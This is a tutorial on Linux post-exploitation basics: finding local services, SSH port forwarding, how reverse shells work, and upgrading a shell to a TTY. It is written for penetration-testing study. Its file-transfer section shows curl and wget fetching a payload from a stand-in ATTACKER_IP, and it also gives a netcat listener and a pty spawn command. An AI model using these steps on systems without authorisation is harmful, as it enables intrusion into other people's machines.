# Linux Local Services, Port Forwarding, and Reverse Shells

## What You Will Learn

In this guide, you will learn:

* What local services are in Linux
* How to identify services running internally on a machine
* How SSH port forwarding helps access internal services
* The difference between bind shells and reverse shells
* How reverse shells work internally
* Why attackers often upgrade basic shells into TTY shells

> **Note:** These concepts are commonly studied in penetration testing and cybersecurity labs. Only perform security testing on systems where you have explicit permission.

---

# Part 1: Understanding Local Services

## What is a Service?

A **service** is a program or process that listens for network connections.

A service usually waits for incoming requests on a specific:

* Protocol (TCP or UDP)
* IP address
* Port number

Example:

```text
Web Server

IP Address: 192.168.1.10

Port: 80

Protocol: TCP
```

This means the web server is listening for HTTP requests on TCP port 80.

---

# Public Services vs Local Services

Not every service on a Linux machine is available to external users.

Services can listen on different network interfaces.

---

## Public Services

A service listening on:

```text
0.0.0.0
```

means:

> Accept connections from all available network interfaces.

Example:

```text
0.0.0.0:80
```

This web server is accessible from external networks.

---

## Local Services

A service listening on:

```text
127.0.0.1
```

is bound only to the **loopback interface**.

Example:

```text
127.0.0.1:3000
```

This means:

* Only the machine itself can access it.
* External users cannot connect directly.

The loopback address is also known as:

```text
localhost
```

---

# Why Do Developers Use Local Services?

Many applications are intentionally configured to listen locally.

Examples:

* Development web servers
* Internal dashboards
* Databases
* Debugging applications
* Administrative tools

This prevents external users from directly accessing sensitive services.

---

# Security Risks of Local Services

Although local services are hidden from external attackers, they can still create security risks.

Imagine:

```text
Local Service

↓

Running as root

↓

Contains vulnerability

↓

Attacker gains root access
```

If an attacker already has a shell on the machine, they may interact with these services locally.

Therefore, local services are an important part of privilege escalation enumeration.

---

# Identifying Local Services

After gaining access to a Linux machine, you should enumerate running services.

---

# Checking Network Interfaces

Use:

```bash
ip a
```

or:

```bash
ip addr
```

This displays:

* Network interfaces
* IP addresses
* Internal network connections

Example:

```text
eth0
192.168.1.20

lo
127.0.0.1
```

The `lo` interface represents localhost.

---

# Checking Listening Ports

Use:

```bash
netstat -lntp
```

This displays TCP services currently listening.

Example output:

```text
tcp

127.0.0.1:3000

python
```

This tells us:

* Port 3000 is open
* It is only accessible locally
* A Python application is running

---

## Understanding netstat Output

Example:

```text
0.0.0.0:80
```

Means:

```text
Accessible from all interfaces
```

Example:

```text
127.0.0.1:8080
```

Means:

```text
Only accessible locally
```

---

# Finding the Application Behind a Service

After finding a port, identify the process.

Commands:

```bash
ps aux
```

or:

```bash
ps -ef
```

Example:

```text
python3 app.py
```

This tells you:

* Which program is running
* Which user owns it
* Whether it is running with elevated privileges

---

# Part 2: SSH Port Forwarding

## Why Do We Need Port Forwarding?

Suppose you discover:

```text
Target Machine

127.0.0.1:7777

Internal Web Application
```

The service is useful, but your attacker machine cannot directly access it.

The network looks like:

```text
Attacker Machine

        X

Target Internal Service
127.0.0.1:7777
```

Port forwarding creates a tunnel between the two systems.

---

# SSH Local Port Forwarding (-L)

## Concept

Local port forwarding allows you to access a remote service through a port on your own machine.

The syntax:

```bash
ssh -L [local_port]:[remote_host]:[remote_port] user@target
```

---

## Example

Imagine:

Target machine:

```text
127.0.0.1:7777
```

You create:

```bash
ssh -L 1338:127.0.0.1:7777 user@target
```

Now:

```text
Your Machine

localhost:1338

        ↓ SSH Tunnel

Target

127.0.0.1:7777
```

You can access the internal service by connecting to:

```text
localhost:1338
```

---

## Common Uses

Local forwarding is useful for accessing:

* Internal web applications
* Databases
* Debugging interfaces
* Development servers

Example:

Open the internal website in your browser:

```text
http://localhost:1338
```

---

# SSH Remote Port Forwarding (-R)

## Concept

Remote port forwarding works in the opposite direction.

It exposes a service running on your machine through the remote system.

Syntax:

```bash
ssh -R [remote_port]:[local_host]:[local_port] user@target
```

---

## Example

Attacker machine:

```text
localhost:1338
```

Remote machine:

```text
localhost:4444
```

Command:

```bash
ssh -R 4444:localhost:1338 user@target
```

Now:

```text
Remote Machine

localhost:4444

        ↓ SSH Tunnel

Attacker Machine

localhost:1338
```

---

# When is Remote Forwarding Useful?

Remote forwarding is useful when:

* The target cannot directly reach your machine
* NAT prevents incoming connections
* You need to expose a local service to the remote machine

---

# Part 3: Reverse Shells in Linux

## What is a Reverse Shell?

A **reverse shell** is a technique that creates a remote command-line connection between an attacker and a compromised machine.

The attacker gains the ability to execute commands on the remote system.

---

# Bind Shell vs Reverse Shell

There are two common ways to establish remote shells.

---

# Bind Shell

In a bind shell:

1. The victim opens a listening port.
2. The attacker connects to it.

Diagram:

```text
Attacker

      |
      |
      ▼

Victim

Listening Port
```

Example:

```text
Victim:

Port 4444 waiting
```

The attacker connects directly.

---

# Problems with Bind Shells

Bind shells often fail because:

### Firewalls

Incoming connections may be blocked.

### NAT

The victim may be behind:

* A router
* Private network
* Firewall

The attacker cannot directly reach the internal machine.

---

# Reverse Shell

A reverse shell reverses the connection direction.

The attacker starts a listener:

```text
Attacker

Listening

     ▲

     |

Victim

Connects Out
```

The victim initiates the connection back.

---

# Why Reverse Shells Are Preferred

## Firewall Advantages

Outbound traffic is usually allowed.

For example:

```text
Victim → Internet
```

is commonly permitted.

However:

```text
Internet → Victim
```

is usually blocked.

---

## NAT Advantages

With NAT:

```text
Public Internet

      |
      |
Router

      |
Private Machine
```

The attacker cannot directly connect to the private machine.

A reverse shell avoids this because the victim creates the connection outward.

---

# File Transfer Methods

Sometimes a reverse shell payload needs to be transferred as a file.

A common approach is:

1. Host the file on the attacker machine.
2. Download it from the target.

---

# Hosting Files with Python

On the attacker machine:

```bash
python3 -m http.server 1337
```

This creates a simple HTTP server.

Files in the current directory become available.

---

# Downloading Files

## Using curl

```bash
curl http://ATTACKER_IP:1337/file
```

---

## Using wget

```bash
wget http://ATTACKER_IP:1337/file -O file
```

---

## Alternative Methods

If common tools are unavailable, scripting languages such as Perl can also be used for file transfer.

---

# How Reverse Shells Work Internally

Regardless of the programming language, every reverse shell performs three main actions.

---

## Step 1: Create a TCP Connection

The target creates a socket connection to the attacker.

```text
Victim

      TCP Connection

        ↓

Attacker Listener
```

---

## Step 2: Start a Shell

The system starts a shell process:

Examples:

```text
/bin/sh

/bin/bash
```

---

## Step 3: Redirect Input and Output

The shell's:

* Standard input
* Standard output
* Standard error

are redirected through the TCP connection.

This allows the attacker to:

* Send commands
* Receive output
* Interact with the shell

---

# Common Reverse Shell Languages

Reverse shells can be created using:

* Bash
* Python
* Perl
* PHP
* Ruby

The choice depends on what software exists on the target system.

---

# Receiving the Connection

The attacker usually waits using a listener.

Example:

```bash
nc -lvnp 4444
```

Options:

* `-l` → Listen mode
* `-v` → Verbose output
* `-n` → No DNS resolution
* `-p` → Port number

---

# Upgrading a Reverse Shell to TTY

## Problem With Basic Shells

A simple reverse shell often lacks:

* Command history
* Tab completion
* Proper terminal formatting
* Interactive applications

Example:

```text
Basic Shell

Limited interaction
```

---

# Creating a Better Interactive Shell

Python can spawn a proper terminal:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

This creates a pseudo-terminal (PTY).

---

# Benefits of a TTY Shell

A full TTY shell provides:

* Better command interaction
* Working terminal controls
* Support for interactive programs
* More reliable administration and testing

---

# Complete Workflow

A typical workflow looks like:

```text
Gain Initial Access

        ↓

Enumerate System

        ↓

Find Local Services

        ↓

Forward Ports if Needed

        ↓

Exploit Vulnerable Service

        ↓

Spawn Reverse Shell

        ↓

Upgrade to TTY

        ↓

Continue Privilege Escalation
```

---

# Key Takeaways

* Local services are applications that only listen on internal interfaces like `127.0.0.1`.
* They are hidden from external users but may still be exploitable after gaining access to a system.
* Commands like `ip a`, `netstat`, and `ps` help identify internal services.
* SSH port forwarding allows access to services that are not directly reachable.
* Local forwarding (`-L`) brings remote services to your machine.
* Remote forwarding (`-R`) exposes your local services to the remote machine.
* Reverse shells are preferred over bind shells because outbound connections are usually easier to establish.
* A reverse shell works by creating a TCP connection, starting a shell, and redirecting input/output through the connection.
* Upgrading a shell to a TTY provides a more stable and interactive terminal experience.
